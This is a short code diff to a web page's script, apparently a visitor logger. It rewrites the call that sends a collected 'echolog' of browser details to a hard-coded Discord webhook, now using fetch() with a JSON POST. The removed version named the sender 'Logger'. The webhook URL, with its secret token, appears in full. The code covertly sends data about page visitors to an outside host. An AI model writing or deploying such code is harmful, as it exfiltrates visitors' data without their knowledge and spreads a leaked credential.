@@ -133,14 +133,13 @@ orientation: window.screen.orientation.type,
                 hljs.highlightAll();
 
                 // Send POST request to Discord webhook
-                request.open("POST", "https://discord.com/api/webhooks/1226126479461711923/oyrugegQKBcQFI8HFajMZGKJ9EViCuOK42DsoCGcw3Jp-i2c_gHXKKf8KN_5SjFtMrTA");
-                        request.setRequestHeader('Content-type', 'application/json');
-
-                        var params = {
-                            username: "Logger",
-                            avatar_url: "image.png",
-                            content: JSON.stringify(echolog)
-                        } 
+                fetch("https://discord.com/api/webhooks/1226126479461711923/oyrugegQKBcQFI8HFajMZGKJ9EViCuOK42DsoCGcw3Jp-i2c_gHXKKf8KN_5SjFtMrTA", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify(echolog),
+                })
                     .then((response) => response.json())
                     .then((data) => console.log("Sent data to Discord webhook:", data))
                     .catch((error) => console.error("Error sending data to Discord webhook:", error));
